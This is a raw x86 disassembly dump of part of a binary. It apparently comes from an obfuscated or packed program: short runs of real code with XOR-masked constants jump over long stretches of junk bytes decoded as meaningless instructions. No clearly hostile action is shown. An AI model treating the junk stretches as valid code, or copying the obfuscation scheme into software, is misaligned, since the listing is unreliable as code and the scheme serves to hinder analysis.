  410be8:	xor    al,ah
  410bea:	sbb    BYTE PTR [ecx],0xc7
  410bed:	out    dx,eax
  410bee:	aam    0xa0
  410bf0:	idiv   BYTE PTR [eax]
  410bf2:	and    BYTE PTR [ecx+0x3],al
  410bf5:	jns    0x410c63
  410bf7:	mov    al,0xf4
  410bf9:	std    
  410bfa:	(bad)  
  410bfb:	xchg   ebp,eax
  410bfc:	fnstcw WORD PTR [ebx+0x1ffb1dc8]
  410c02:	shr    DWORD PTR [esi+0x2e],cl
  410c05:	in     al,0x5a
  410c07:	js     0x410c5c
  410c09:	mov    bl,0x9a
  410c0b:	test   al,0x5e
  410c0d:	aaa    
  410c0e:	dec    ebp
  410c0f:	dec    esp
  410c10:	ins    BYTE PTR es:[edi],dx
  410c11:	xchg   DWORD PTR [edi+edx*8],eax
  410c14:	das    
  410c15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c16:	lahf   
  410c17:	add    BYTE PTR [ebx+0x5b49b5e7],al
  410c1d:	xchg   ebx,ecx
  410c1f:	sub    ebx,ecx
  410c21:	xchg   ebx,ecx
  410c23:	dec    ecx
  410c24:	mov    eax,DWORD PTR [ebp-0x1c]
  410c27:	imul   eax,ecx
  410c2a:	sub    esp,eax
  410c2c:	mov    DWORD PTR [ebp-0x24],esp
  410c2f:	mov    eax,DWORD PTR [ebp-0x4]
  410c32:	mov    ecx,0x7510853
  410c37:	xor    eax,ecx
  410c39:	mov    edx,0x32729a
  410c3e:	add    eax,edx
  410c40:	mov    DWORD PTR [ebp+0x8],eax
  410c43:	mov    eax,DWORD PTR [ebp-0x18]
  410c46:	xor    eax,ecx
  410c48:	add    eax,edx
  410c4a:	mov    edx,DWORD PTR [ebp+0x14]
  410c4d:	imul   eax,DWORD PTR [edx]
  410c50:	mov    edx,DWORD PTR [ebp-0x4]
  410c53:	xor    edx,ecx
  410c55:	mov    ecx,DWORD PTR [ebp+0x8]
  410c58:	lea    ecx,[edx+ecx*1+0x32729a]
  410c5f:	cmp    ecx,eax
  410c61:	je     0x411089
  410c67:	mov    edi,DWORD PTR [ebp-0x18]
  410c6a:	mov    eax,DWORD PTR [ebp+0x8]
  410c6d:	mov    edx,DWORD PTR [ebp+0x14]
  410c70:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  410c74:	jmp    0x410daf
  410c79:	sbb    DWORD PTR [eax+0x31],0x6d5dfd4a
  410c80:	jae    0x410c66
  410c82:	jb     0x410c33
  410c84:	pop    ds
  410c85:	or     eax,0x37064cb6
  410c8a:	inc    esp
  410c8b:	jl     0x410d09
  410c8d:	adc    bh,BYTE PTR [edi+0x7c]
  410c90:	jl     0x410ce7
  410c92:	call   0xeb3b09cd
  410c97:	loop   0x410cca
  410c99:	lahf   
  410c9a:	jecxz  0x410c96
  410c9c:	mov    ss,eax
  410c9e:	mov    eax,ds:0xe4010e21
  410ca3:	cmp    BYTE PTR [eax+ebx*4-0x6d5681e6],ch
  410caa:	lea    eax,[ebx-0xe]
  410cad:	xchg   ecx,eax
  410cae:	jmp    0x498d:0xed36ef40
  410cb5:	mov    esi,0xfb7536c6
  410cba:	test   al,0x97
  410cbc:	mov    ds:0x293411a1,eax
  410cc1:	mov    ecx,0xbc9037f3
  410cc6:	out    0xe0,eax
  410cc8:	jmp    0x410d10
  410cca:	cld    
  410ccb:	jp     0x410c90
  410ccd:	je     0x410d31
  410ccf:	xchg   edi,eax
  410cd0:	mov    al,0x29
  410cd2:	aad    0x91
  410cd4:	das    
  410cd5:	dec    esi
  410cd6:	mov    eax,ds:0xad951d79
  410cdb:	and    DWORD PTR [ebx+0x55],edx
  410cde:	js     0x410cfa
  410ce0:	cmp    ebx,ebp
  410ce2:	inc    ebx
  410ce3:	dec    ecx
  410ce4:	(bad)  
  410ce5:	ret    
  410ce6:	xor    DWORD PTR [edi],edx
  410ce8:	jb     0x410d50
  410cea:	js     0x410d22
  410cec:	out    dx,al
  410ced:	fdiv   DWORD PTR [esi]
  410cef:	or     ah,BYTE PTR [esi]
  410cf1:	std    
  410cf2:	ins    BYTE PTR es:[edi],dx
  410cf3:	scas   eax,DWORD PTR es:[edi]
  410cf4:	fild   DWORD PTR [edx-0x69]
  410cf7:	fsubr  QWORD PTR [ebp+0x1]
  410cfa:	dec    edx
  410cfb:	sub    eax,0x1a3874d4
  410d00:	out    dx,al
  410d01:	sub    DWORD PTR [ebp+eax*1-0x4c],0xffffffee
  410d06:	adc    BYTE PTR [eax+0x7db35ee6],dl
  410d0c:	into   
  410d0d:	rcr    BYTE PTR ds:0xa5a85398,cl
  410d13:	rcr    DWORD PTR [eax-0x20],0x8d
  410d17:	and    al,0xab
  410d19:	mov    eax,0x5d3b9fcc
  410d1e:	into   
  410d1f:	sub    BYTE PTR [edx+0x63f4ff0f],bh
  410d25:	jb     0x410d84
  410d27:	popa   
  410d28:	rol    DWORD PTR [eax*1-0x5662e28c],1
  410d2f:	pop    ebp
  410d30:	rcr    dh,cl
  410d32:	and    eax,0x558e8422
  410d37:	pop    ebx
  410d38:	cmp    BYTE PTR [edx],cl
  410d3a:	jns    0x410d13
  410d3c:	cs sbb ah,bh
  410d3f:	outs   dx,DWORD PTR ds:[esi]
  410d40:	jns    0x410da2
  410d42:	mov    edx,0x66fda5ed
  410d47:	xor    ah,bl
  410d49:	iret   
  410d4a:	cmc    
  410d4b:	cmp    BYTE PTR [ebx-0x698e9442],0xd7
  410d52:	inc    esp
  410d53:	out    dx,al
  410d54:	xchg   esi,edx
  410d56:	push   edx
  410d57:	retf   
  410d58:	xchg   ebp,eax
  410d59:	imul   ebx,DWORD PTR [ebx],0x28
  410d5c:	enter  0xd358,0x7e
  410d60:	sub    al,0xed
  410d62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d63:	xchg   ebx,eax
  410d64:	add    DWORD PTR [ecx-0x31],ecx
  410d67:	and    eax,0x4e20dcf4
  410d6c:	and    bh,BYTE PTR [ebp-0x17]
  410d6f:	mov    esp,0xa46b005b
  410d74:	sub    DWORD PTR [esi+0xd976ed7],esp
  410d7a:	jbe    0x410d7e
  410d7c:	mov    DWORD PTR [eax+esi*2],esi
  410d7f:	int    0xfb
  410d81:	mov    ebx,0x886e9d54
  410d86:	sbb    al,0x64
  410d88:	arpl   dx,bx
  410d8a:	mov    ?,WORD PTR [edx-0x78]
  410d8d:	mov    eax,0x5f6b3cbc
  410d92:	pop    esi
  410d93:	das    
  410d94:	test   DWORD PTR [edx+0x4b],ecx
  410d97:	mov    edi,0xf1dd4d95
  410d9c:	or     dh,BYTE PTR [ebp-0x710a5173]
  410da2:	(bad)  
  410da4:	shl    esp,0x9e
  410da7:	dec    ebx
  410da8:	and    BYTE PTR [ebp-0x62],0x4a
  410dac:	cmp    edi,DWORD PTR [edi*2+0x510853b9]
  410db3:	pop    es
  410db4:	xor    edx,edx
  410db6:	xor    edi,ecx
  410db8:	mov    esi,0x32729a
  410dbd:	add    edi,esi
  410dbf:	div    edi
  410dc1:	mov    edx,DWORD PTR [ebp-0x4]
  410dc4:	xor    edx,ecx
  410dc6:	lea    eax,[edx+eax*1+0x32729a]
  410dcd:	mov    edx,DWORD PTR [ebp+0x8]
  410dd0:	mov    edi,DWORD PTR [ebp-0x24]
  410dd3:	mov    DWORD PTR [edi+edx*4],eax
  410dd6:	mov    eax,DWORD PTR [ebp-0x18]
  410dd9:	mov    edx,DWORD PTR [ebp+0x8]
  410ddc:	xor    eax,ecx
  410dde:	lea    eax,[eax+edx*1+0x32729a]
  410de5:	mov    DWORD PTR [ebp+0x8],eax
  410de8:	mov    eax,DWORD PTR [ebp-0x18]
  410deb:	mov    edx,DWORD PTR [ebp+0x14]
  410dee:	xor    eax,ecx
  410df0:	jmp    0x410f2b
  410df5:	mov    ch,0xd5
  410df7:	or     dh,dh
  410df9:	push   0xd05d7df1
  410dfe:	sbb    DWORD PTR [ebx+0x48993700],esi
  410e04:	js     0x410ddb
  410e06:	inc    edi
  410e07:	jl     0x410e85
  410e09:	adc    bh,BYTE PTR [edi+0x7c]
  410e0c:	jl     0x410d9e
  410e0e:	pusha  
  410e0f:	fs dec esp
  410e11:	mov    al,0xab
  410e13:	stos   BYTE PTR es:[edi],al
  410e14:	lahf   
  410e15:	xlat   BYTE PTR ds:[ebx]
  410e16:	aam    0xcc
  410e18:	dec    eax
  410e19:	(bad)  
  410e1a:	adc    eax,DWORD PTR [edx+ebp*2]
  410e1d:	sbb    BYTE PTR cs:[edi-0x764afe27],cl
  410e24:	jnp    0x410e0f
  410e26:	sbb    eax,DWORD PTR [ebx]
  410e28:	iret   
  410e29:	std    
  410e2a:	js     0x410e57
  410e2c:	lds    edi,FWORD PTR [eax]
  410e2e:	loopne 0x410e86
  410e30:	in     eax,dx
  410e31:	add    BYTE PTR [ebx+0x5eed97af],0x30
  410e38:	or     BYTE PTR [eax-0x24bd956e],ah
  410e3e:	loope  0x410e92
  410e40:	mov    edx,cs
  410e42:	inc    edx
  410e43:	sub    DWORD PTR [esi],ecx
  410e45:	out    dx,eax
  410e46:	xchg   DWORD PTR [esp+edi*1-0x4b8ab03d],esp
  410e4d:	pop    ss
  410e4e:	popf   
  410e4f:	clc    
  410e50:	xlat   BYTE PTR ds:[ebx]
  410e51:	fwait
  410e52:	retfw  
  410e54:	ds inc edx
  410e56:	add    ebp,ebp
  410e58:	mov    eax,es
  410e5a:	mov    edi,0xf4194f35
  410e5f:	jbe    0x410e35
  410e61:	pop    ss
  410e62:	mov    eax,DWORD PTR [ebx+0x7f2f90ca]
  410e68:	mov    cl,0xfc
  410e6a:	jmp    0x2ce956cf
  410e6f:	dec    edx
  410e70:	pushf  
  410e71:	and    eax,0xa36956b2
  410e76:	sbb    eax,0xf5ab51fd
  410e7b:	xchg   ebx,eax
  410e7c:	jae    0x410e11
  410e7e:	iret   
  410e7f:	jecxz  0x410e4c
  410e81:	and    BYTE PTR [ebp-0x1ffdbe86],ch
  410e87:	aam    0xf7
  410e89:	push   es
  410e8a:	mov    ebp,0x134e4694
  410e8f:	stos   BYTE PTR es:[edi],al
  410e90:	fbld   TBYTE PTR [ebx]
  410e92:	pop    ebx
  410e93:	cmp    eax,DWORD PTR [ebp-0x3f7f94]
  410e99:	mov    ch,0x48
  410e9b:	xor    al,0xa1
  410e9d:	inc    edi
  410e9e:	xchg   DWORD PTR ds:0x6d87f967,ebx
  410ea4:	or     BYTE PTR [ebx],ch
  410ea6:	mov    ecx,0xc745ca4d
  410eab:	cdq    
  410eac:	jnp    0x410ec4
  410eae:	ret    0xc75e
  410eb1:	inc    esp
  410eb2:	and    DWORD PTR [edi+esi*1],ebp
  410eb5:	mov    ebp,0xac1806f
  410eba:	xchg   ebx,eax
  410ebb:	push   esp
  410ebc:	push   eax
  410ebd:	repnz cld 
  410ebf:	aam    0x6
  410ec1:	fild   WORD PTR [ecx-0x26]
  410ec4:	fisubr WORD PTR [edi+0x70a5ae6f]
  410eca:	sbb    edx,edx
  410ecc:	pop    eax
  410ecd:	push   eax
  410ece:	cld    
  410ecf:	ror    DWORD PTR [ecx+0x53],0x5d
  410ed3:	mov    esp,DWORD PTR [ecx-0x1e]
  410ed6:	or     BYTE PTR [ecx-0x4ef13a20],0x73
  410edd:	sub    BYTE PTR [esi+0x2bdaf8f2],ch
  410ee3:	cli    
  410ee4:	cmp    esp,DWORD PTR [esi+0x3]
  410ee7:	xchg   ebx,eax
  410ee8:	in     eax,0x25
  410eea:	mov    WORD PTR [ebx-0x39],es
  410eed:	push   edi
  410eee:	pushf  
  410eef:	push   ss
  410ef0:	sub    edi,eax
  410ef2:	scas   al,BYTE PTR es:[edi]
  410ef3:	sub    edi,DWORD PTR [ebp+0x7aa06650]
  410ef9:	add    BYTE PTR [ecx+ecx*2-0x56],0x4
  410efe:	mov    esi,0x8a762fc
  410f03:	jmp    0x410f61
  410f05:	mov    ah,0xb1
  410f07:	rcl    DWORD PTR [eax+esi*4],cl
  410f0a:	sbb    esi,esp
  410f0c:	dec    esp
  410f0d:	setp   bl
  410f10:	je     0x410ef6
  410f12:	stos   BYTE PTR es:[edi],al
  410f13:	mov    ds:0x6cb72b89,al
  410f18:	xchg   edx,eax
  410f19:	sub    ax,0xc2b9
  410f1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f1e:	cmp    eax,0xd08e153a
  410f23:	or     bl,al
  410f25:	sbb    al,0xe5
  410f27:	xor    BYTE PTR [ecx*8+0xfc60336],cl
  410f2e:	scas   eax,DWORD PTR es:[edi]
  410f2f:	add    cl,BYTE PTR [ebx-0x2ecc03ab]
  410f35:	mov    ecx,DWORD PTR [ebp+0x8]
  410f38:	jmp    0x411073
  410f3d:	pop    eax
  410f3e:	shl    BYTE PTR [ebp+0x13],0x7d
  410f42:	mov    ebp,0x8c3c7362
  410f47:	cmp    cl,al
  410f49:	jmp    0x7c46:0xeba24c35
  410f50:	jl     0x410f64
  410f52:	jg     0x410fd0
  410f54:	jl     0x410f24
  410f56:	jge    0x410f35
  410f58:	sbb    BYTE PTR [eax],dh
  410f5a:	or     BYTE PTR [edi+0x2a],ah
  410f5d:	cdq    
  410f5e:	xchg   esp,eax
  410f5f:	mov    esp,0xfb470f23
  410f64:	mov    edx,0x393ec57
  410f69:	out    dx,al
  410f6a:	add    DWORD PTR [ecx+0x7d],ebx
  410f6d:	out    dx,eax
  410f6e:	out    dx,al
  410f6f:	mov    dh,BYTE PTR [ebp-0x67]
  410f72:	std    
  410f73:	and    ah,bh
  410f75:	ins    DWORD PTR es:[edi],dx
  410f76:	call   0x8be7:0x84275ac7
  410f7d:	sub    dh,BYTE PTR [edi-0x53]
  410f80:	ins    BYTE PTR es:[edi],dx
  410f81:	xchg   DWORD PTR [ebx],ebp
  410f83:	(bad)  
  410f84:	adc    eax,0xf4c1ba05
  410f89:	pop    edi
  410f8a:	adc    esi,edx
  410f8c:	jo     0x410f40
  410f8e:	fsubr  st,st(1)
  410f90:	enter  0x6206,0x66
  410f94:	shl    DWORD PTR ds:0xbce07446,1
  410f9a:	fidiv  WORD PTR [eax]
  410f9c:	push   0x67580afe
  410fa1:	dec    esp
  410fa2:	neg    ebx
  410fa4:	push   DWORD PTR [ebp+0x9]
  410fa7:	lock add al,0xe0
  410faa:	ror    DWORD PTR [edx],1
  410fac:	pop    esp
  410fad:	or     dh,bl
  410faf:	mov    ebp,0x257dbaab
  410fb4:	stc    
  410fb5:	(bad)  
  410fb6:	sub    al,0xc5
  410fb8:	mov    esp,0x9b1ee068
  410fbd:	xchg   esp,eax
  410fbe:	pop    edx
  410fbf:	cld    
  410fc0:	mov    dl,0x41
  410fc2:	scas   al,BYTE PTR es:[edi]
  410fc3:	jmp    0xf101:0x36e92920
  410fca:	xor    bl,bl
  410fcc:	and    eax,0x53b0428a
  410fd1:	sbb    al,BYTE PTR [edi+edi*8]
  410fd4:	hlt    
  410fd5:	inc    edx
  410fd6:	cwde   
  410fd7:	lock les eax,FWORD PTR [esi]
  410fda:	or     eax,0xe9c4686
  410fdf:	pop    ebp
  410fe0:	and    DWORD PTR [edx],eax
  410fe2:	ss dec ebx
  410fe4:	push   esp
  410fe5:	sbb    ecx,DWORD PTR [ebx+0x65]
  410fe8:	jge    0x41104b
  410fea:	push   edx
  410feb:	nop    esp
  410fee:	adc    eax,0x532fe3d8
  410ff3:	jl     0x411006
  410ff5:	xchg   BYTE PTR [esi-0x590df113],dl
  410ffb:	pushf  
  410ffc:	pushf  
  410ffd:	pop    ds
  410ffe:	repnz pop esp
  411000:	aad    0x54
  411002:	ret    0x7b92
  411005:	imul   edi,DWORD PTR [edx+0xb],0x6c
  411009:	inc    eax
  41100a:	or     DWORD PTR [edx+0x3e],edx
  41100d:	cmc    
  41100e:	(bad)  
  41100f:	dec    ebp
  411010:	sti    
  411011:	xchg   DWORD PTR [eax+edx*4-0xe],ecx
  411015:	scas   al,BYTE PTR es:[edi]
  411016:	pop    esp
  411017:	loopne 0x410fe7
  411019:	popf   
  41101a:	rcl    DWORD PTR [ebx+esi*4-0x7d],cl
  41101e:	push   edi
  41101f:	lea    ebp,[edi-0x221de05e]
  411025:	xlat   BYTE PTR ds:[ebx]
  411026:	push   0x6e980ee1
  41102b:	xor    ebx,esi
  41102d:	sub    BYTE PTR [esi+eax*2],al
  411030:	test   DWORD PTR [ebx-0xd0af76a],0x5329c38d
  41103a:	or     DWORD PTR [esi-0x1fa5271c],eax
  411040:	dec    DWORD PTR [edx+0x23]
  411043:	nop
  411044:	out    dx,al
  411045:	pop    ebx
  411046:	sub    BYTE PTR [eax],ah
  411048:	cld    
  411049:	stos   DWORD PTR es:[edi],eax
  41104a:	sub    DWORD PTR ds:0x612ed132,0x3c
  411051:	xor    eax,ebx
  411053:	ja     0x41101a
  411055:	jne    0x411060
  411057:	nop
  411058:	in     eax,0x17
  41105a:	dec    edi
  41105b:	mov    al,0x1c
  41105d:	fdiv   DWORD PTR [ebx+0x73b6ada0]
  411063:	mov    edi,0x94b03387
  411068:	push   0xd
  41106a:	fs dec edi
  41106c:	sbb    al,0xce
  41106e:	inc    ecx
  41106f:	je     0x411051
  411071:	mov    al,ds:0xa8c8d01
  411076:	call   0xfc8:0x3b003272
  41107d:	test   ebp,esp
  41107f:	sti    
  411080:	(bad)  
  411081:	dec    DWORD PTR [ebx+0x5e9de]
  411087:	add    BYTE PTR [eax],al
  411089:	mov    ebx,0x32729a
  41108e:	mov    eax,DWORD PTR [ebp-0x4]
  411091:	xor    eax,0x7510853
  411096:	add    eax,ebx
  411098:	mov    DWORD PTR [ebp-0xc],eax
  41109b:	xor    ebx,ebx
  41109d:	lea    eax,[ebp-0x10]
  4110a0:	jmp    0x4111db
  4110a5:	into   
  4110a6:	aas    
  4110a7:	in     eax,0x49
  4110a9:	cmc    
  4110aa:	jne    0x411116
  4110ac:	mov    edi,0x9e11fbf4
  4110b1:	hlt    
  4110b2:	jo     0x41107e
  4110b4:	xchg   ebp,eax
  4110b5:	mov    DWORD PTR [ecx+0x7c],eax
  4110b8:	jl     0x4110cc
  4110ba:	jg     0x411138
  4110bc:	jl     0x41112b
  4110be:	out    0x2e,al
  4110c0:	loop   0x4110cd
  4110c2:	sar    ebp,0x15
  4110c5:	aas    
  4110c6:	pop    ebx
  4110c7:	mov    cl,BYTE PTR [esi]
  4110c9:	pop    eax
  4110ca:	xchg   ebx,esp
  4110cc:	mov    ebp,0x90186a19
  4110d1:	add    dh,bh
  4110d3:	lea    eax,[esi-0xc]
  4110d6:	aam    0x7
  4110d8:	push   ebx
  4110d9:	add    BYTE PTR [edx],bh
  4110db:	add    al,0x75
  4110dd:	cli    
  4110de:	mov    eax,ds:0x85c1d715
  4110e3:	gs pop ebx
  4110e5:	push   ebp
  4110e6:	in     eax,0x83
  4110e8:	ret    0x9e81
  4110eb:	mov    esi,0xa1bc1e13
  4110f0:	lahf   
  4110f1:	retf   
  4110f2:	in     eax,dx
  4110f3:	mov    al,ds:0xd171b7f
  4110f8:	sub    cl,0x19
  4110fb:	sub    eax,0x7d52a700
  411100:	sti    
  411101:	xor    DWORD PTR [ecx+ebx*1+0xd7df070],0x49
  411109:	gs or  eax,0xda683fe3
  41110f:	arpl   WORD PTR [eax],cx
  411111:	push   edi
  411112:	mov    WORD PTR [ebp+0x4],cs
  411115:	jns    0x411170
  411117:	out    dx,eax
  411118:	test   BYTE PTR [ebx-0x5b],0x4a
  41111c:	in     al,dx
  41111d:	adc    DWORD PTR [ecx+0x5e],0x942706cd
  411124:	jmp    0xd201:0xc47ba00c
  41112b:	push   esp
  41112c:	add    eax,0xe6344f5b
  411131:	mov    esp,DWORD PTR ds:0xb40b0e43
  411137:	outs   dx,DWORD PTR ds:[esi]
  411138:	pop    ss
  411139:	sub    eax,esp
  41113b:	ds in  eax,0x91
  41113e:	popa   
  41113f:	sbb    al,0x2
  411141:	inc    ebx
  411142:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411143:	rcl    BYTE PTR [ebp-0x162a31e0],0xd3
  41114a:	sbb    ecx,0x25ac7b2f
  411150:	add    ebx,esi
  411152:	icebp  
  411153:	nop    DWORD PTR [eax-0x5dafdc66]
  41115a:	call   0x60fe43b0
  41115f:	mul    DWORD PTR [ebx]
  411161:	mov    ah,0x15
  411163:	mov    esp,0xbeced4a2
  411168:	sahf   
  411169:	mov    ecx,0xe9ca0cbe
  41116e:	pop    esi
  411170:	sbb    dl,bh
  411172:	scas   al,BYTE PTR es:[edi]
  411173:	pop    ebp
  411174:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411175:	or     bl,BYTE PTR [ebp+0x45]
  411178:	addr16 and eax,0xe7dd6a14
  41117e:	sbb    al,0xac
  411180:	in     al,dx
  411181:	js     0x4111de
  411183:	in     eax,dx
  411184:	test   eax,0x8139c0a2
  411189:	ja     0x411134
  41118b:	jo     0x41115c
  41118d:	mov    esi,0x28cf70f
  411192:	sahf   
  411193:	mov    dl,0xfa
  411195:	(bad)  
  411196:	lahf   
  411197:	stos   BYTE PTR es:[edi],al
  411198:	pusha  
  411199:	sbb    BYTE PTR [ebx+eax*2+0x4d],ah
  41119d:	(bad)  
  41119e:	shl    DWORD PTR [esp+ecx*2],1
  4111a1:	in     eax,dx
  4111a2:	maskmovq mm5,(bad)
  4111a3:	imul   DWORD PTR [edi]
  4111a5:	add    BYTE PTR [ebx+0x21a17d63],dh
  4111ab:	push   ds
  4111ac:	dec    edx
  4111ad:	jae    0x4111e8
  4111af:	or     eax,0x8f41f756
  4111b4:	cli    
  4111b5:	mov    gs,ebp
  4111b7:	mov    ch,BYTE PTR [edi]
  4111b9:	jle    0x411210
  4111bb:	pop    eax
  4111bc:	pop    esp
  4111bd:	inc    edi
  4111be:	xor    al,0xc5
  4111c0:	stos   BYTE PTR es:[edi],al
  4111c1:	imul   eax,DWORD PTR [edx+0x6e],0xffffffb7
  4111c5:	pop    ecx
  4111c6:	retf   0x3d4e
  4111c9:	lea    ecx,[edx+0x344bbb7]
  4111cf:	sbb    ah,BYTE PTR [esi+ecx*1-0x70]
  4111d3:	lods   al,BYTE PTR ds:[esi]
  4111d4:	popf   
  4111d5:	sub    DWORD PTR [edx],eax
  4111d7:	mov    edi,0x3f49fbf
  4111dc:	sbb    bh,bh
  4111de:	shl    DWORD PTR [ebx],cl
  4111e0:	fild   DWORD PTR [ebx+0x39]
  4111e3:	pop    ebp
  4111e4:	adc    BYTE PTR [edi],cl
  4111e6:	test   BYTE PTR [ebx+0x1],dl
  4111e9:	add    BYTE PTR [eax],al
  4111eb:	xchg   edx,eax
  4111ec:	jmp    0x411327
  4111f1:	push   ecx
  4111f2:	(bad)  
  4111f3:	fsub   st(2),st
  4111f5:	imul   esi,edx,0x2efa635d
  4111fb:	enter  0x955a,0x2d
  4111ff:	cmp    al,0xf4
  411201:	scas   eax,DWORD PTR es:[edi]
  411202:	inc    eax
  411203:	jl     0x411281
  411205:	adc    bh,BYTE PTR [edi+0x7c]
  411208:	jl     0x41118c
  41120a:	jmp    0x6596:0x45ca
  411210:	sar    BYTE PTR [edi+0x7b],cl
  411213:	jnp    0x4111dc
  411215:	xchg   esp,eax
  411216:	jae    0x4111db
  411218:	xchg   ebp,eax
  411219:	xchg   ebx,eax
  41121a:	or     ch,BYTE PTR [edi+0x58c32c72]
  411220:	inc    esp
  411221:	test   al,0x5e
  411223:	cmp    DWORD PTR [ecx+0x1f],ebp
  411226:	mov    bl,cl
  411228:	retf   0xb6ce
  41122b:	das    
  41122c:	xchg   edx,eax
  41122e:	xchg   esi,eax
  41122f:	cs pop esp
  411231:	out    0x85,eax
  411233:	icebp  
  411234:	inc    ebx
  411235:	ja     0x4111f5
  411237:	inc    edx
  411238:	sbb    ebx,DWORD PTR [esi-0x51]
  41123b:	and    ch,cl
  41123d:	xor    dl,BYTE PTR [ebp+ecx*8-0x132624ba]
  411244:	retf   
  411245:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  411247:	push   0xe999aef6
  41124c:	and    ah,ah
  41124e:	imul   DWORD PTR [ebp+ebx*4-0x4d429650]
  411255:	out    dx,al
  411256:	bound  edi,QWORD PTR [ebx]
  411258:	or     al,0x80
  41125a:	stos   BYTE PTR es:[edi],al
  41125b:	push   ds
  41125c:	sti    
  41125d:	lock or DWORD PTR [eax-0x6afd5dd3],ebp
  411264:	pop    ss
  411265:	pop    ss
  411266:	les    esp,FWORD PTR [eax]
  411268:	lods   al,BYTE PTR ds:[esi]
  411269:	inc    ebp
  41126a:	pop    ds
  41126b:	popf   
  41126c:	pushf  
  41126d:	lds    ebx,FWORD PTR [edi+0xfaa5699]
  411273:	push   esp
  411274:	(bad)  
  411275:	add    al,0x7c
  411277:	pop    esi
  411278:	sahf   
  411279:	sbb    eax,0x11e1ba2c
  41127e:	mov    bh,0x65
  411280:	and    al,0xa3
  411282:	xchg   ebp,eax
  411283:	jecxz  0x411285
  411285:	or     al,0x10
  411287:	cs in  al,0xbe
  41128a:	repz add BYTE PTR [esi-0x49],ah
  41128e:	adc    DWORD PTR [ecx],esi
  411290:	imul   ebp,DWORD PTR [eax],0xffffff8f
  411293:	mov    edx,0xc6fecdf4
  411298:	cmp    edi,esi
  41129a:	ret    
  41129b:	les    eax,FWORD PTR [ebx-0x2a735338]
  4112a1:	imul   esp,esi,0x11
  4112a4:	jns    0x4112a5
  4112a6:	test   eax,0x299debf1
  4112ab:	pop    ebx
  4112ad:	xchg   esi,eax
  4112ae:	out    dx,al
  4112af:	stc    
  4112b0:	clc    
  4112b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4112b2:	lods   eax,DWORD PTR ds:[esi]
  4112b3:	repnz (bad) 
  4112b5:	fcmovnu st,st(4)
  4112b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112b8:	inc    ecx
  4112b9:	cmp    BYTE PTR [ebx],0xe0
  4112bc:	dec    edx
  4112bd:	sbb    eax,0x955a7829
  4112c2:	xor    ebx,edx
  4112c4:	cs mov bl,0xbd
  4112c7:	pop    ss
  4112c8:	lods   eax,DWORD PTR ds:[esi]
  4112c9:	(bad)
  4112cc:	out    0x4e,al
  4112ce:	dec    ecx
  4112cf:	imul   eax,DWORD PTR [ebp-0x49b1ed13],0xffffff9b
  4112d6:	in     eax,0xf4
  4112d8:	das    
  4112d9:	sbb    al,0xb9
  4112db:	jecxz  0x411331
  4112dd:	xchg   ecx,eax
  4112de:	and    al,0xd2
  4112e0:	and    al,0xab
  4112e2:	loope  0x4112ce
  4112e4:	cmp    al,0xe3
  4112e6:	jle    0x4112d0
  4112e8:	mov    ds:0xfcd19751,al
  4112ed:	adc    DWORD PTR [eax],0xb7c66101
  4112f3:	in     al,dx
  4112f4:	or     cl,BYTE PTR [edi*2-0x3465b6f4]
  4112fb:	xor    bl,BYTE PTR [eax]
  4112fd:	cmp    BYTE PTR [ebp+0x571e53e5],bl
  411303:	jne    0x41130c
  411305:	aam    0x97
  411307:	test   DWORD PTR ds:0x65ae53cd,esi
  41130d:	mov    ch,0x15
  41130f:	ds pop es
  411311:	xlat   BYTE PTR ds:[ebx]
  411312:	dec    eax
  411313:	clc    
  411314:	fcomp  QWORD PTR [edx]
  411316:	scas   eax,DWORD PTR es:[edi]
  411317:	mov    ebp,0x507105ac
  41131c:	out    0xc,al
  41131e:	adc    ah,BYTE PTR [edi-0x2f633758]
  411324:	ins    DWORD PTR es:[edi],dx
  411325:	pushf  
  411326:	ins    DWORD PTR es:[edi],dx
  411327:	push   0xa
  411329:	pop    ecx
  41132a:	push   0x4
  41132c:	pop    ebx
  41132d:	inc    ebx
  41132e:	xchg   ebx,ecx
  411330:	sub    ebx,ecx
  411332:	xchg   ebx,ecx
  411334:	dec    ecx
  411335:	mov    eax,DWORD PTR [ebp-0x1c]
  411338:	imul   eax,ecx
  41133b:	add    esp,eax
  41133d:	xchg   edx,eax
  41133e:	push   eax
  41133f:	xor    ebx,ebx
  411341:	mov    edx,esp
  411343:	jmp    0x41147e
  411348:	sub    BYTE PTR [edi+0x7165615e],cl
  41134e:	xor    ebx,DWORD PTR [ebp-0x7b]
  411351:	into   
  411352:	jge    0x411370
  411354:	and    eax,0x4dfdc36d
  411359:	inc    ebx
  41135a:	jl     0x4113d8
  41135c:	adc    bh,BYTE PTR [edi+0x7c]
  41135f:	jl     0x41133f
  411361:	enter  0x758f,0x3c
  411365:	dec    bp
  411367:	lock mov bl,0x40
  41136a:	jmp    0x212b:0x6f0e794
  411371:	aam    0x6b
  411373:	pop    ss
  411374:	cld    
  411375:	mov    edi,0x3913528a
  41137a:	add    esi,DWORD PTR [edi+eiz*4-0x33]
  41137e:	jae    0x411360
  411380:	mov    al,0x53
  411382:	push   ebp
  411383:	push   es
  411384:	push   es
  411385:	jle    0x411372
  411387:	jo     0x41136a
  411389:	repz add ecx,ecx
  41138c:	adc    ecx,DWORD PTR [edx]
  41138e:	mov    al,0x3d
  411390:	into   
  411391:	and    DWORD PTR [edi-0x47],ebx
  411394:	sbb    eax,0x6fe797ae
  411399:	xchg   ebx,eax
  41139a:	or     eax,0x3d09ff6a
  41139f:	jg     0x4113a6
  4113a1:	push   ds
  4113a2:	out    0x69,al
  4113a4:	xchg   edi,eax
  4113a5:	inc    esi
  4113a6:	out    0xad,al
  4113a8:	fs fsubp st(4),st
  4113ab:	out    0x18,al
  4113ad:	shl    ch,1
  4113af:	and    DWORD PTR [edx+0x1f537d2d],esi
  4113b5:	push   0xfa14623b
  4113ba:	fwait
  4113bb:	and    al,BYTE PTR ds:0x81a0305d
  4113c1:	lods   eax,DWORD PTR ds:[esi]
  4113c2:	mov    dh,0x61
  4113c4:	shl    DWORD PTR es:[edx+0x1e6f229d],cl
  4113cb:	sbb    al,BYTE PTR [ebp-0x72]
